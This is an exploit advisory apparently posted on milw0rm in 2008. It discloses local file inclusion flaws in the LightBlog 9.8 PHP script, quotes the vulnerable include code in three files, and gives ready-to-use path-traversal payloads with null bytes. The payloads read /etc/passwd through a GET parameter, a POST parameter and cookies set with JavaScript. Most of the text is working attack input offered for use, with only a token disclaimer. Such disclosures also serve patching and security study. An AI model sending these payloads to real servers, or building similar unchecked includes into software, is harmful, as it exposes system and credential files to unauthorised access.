<html><head><title>LightBlog 9.8 (GET,POST,COOKIE) Multiple LFI Vulnerabilities</title></head><pre># LightBlog 9.8 (GET,POST,COOKIE) Multiple Local File Inclusion Vulnerabilies
# url: http://www.publicwarehouse.co.uk/php_scripts/lightblog.php
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://spanish-hackers.com
# team: Spanish Hackers Team - [SHT]
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.

vuln file: view_member.php
vuln code:
8: if(isset($_GET['username']) and file_exists(&quot;./accounts/&quot;.$_GET['username'].&quot;.php&quot;)){
x: ...
24: include(&quot;./accounts/{$username_get}.php&quot;);
39: }

PoC: GET view_member.php?username=[file]%00
ExP: GET view_member.php?username=../../../../../../../../../../etc/passwd%00

---

vuln file: login.php
vuln code:
18: include(&quot;./accounts/&quot;.$_POST['username_post'].&quot;.php&quot;);

PoC: POST login.php?username_post=[file]%00
ExP: POST login.php?username_post=../../../../../../../../../../etc/passwd%00

---

vuln file: check_user.php
vuln code: 
6: if(isset($_COOKIE['Lightblog_username']) and isset($_COOKIE['Lightblog_password'])){

   $username_cookie = $_COOKIE['Lightblog_username'];
   $password_cookie = $_COOKIE['Lightblog_password'];

   if(file_exists(&quot;./accounts/{$username_cookie}.php&quot;)){
13:include(&quot;./accounts/{$username_cookie}.php&quot;);

PoC: javascript:document.cookie = &quot;Lightblog_username=[file]%00; path=/&quot;; document.cookie = &quot;Lightblog_password=JosS;
     path=/&quot;;
ExP: javascript:document.cookie = &quot;Lightblog_username=../../../../../../../../../../etc/passwd%00; path=/&quot;;
     document.cookie = &quot;Lightblog_password=JosS; path=/&quot;;

---

and more ...
hack0wn :D

# milw0rm.com [2008-10-21]</pre></html>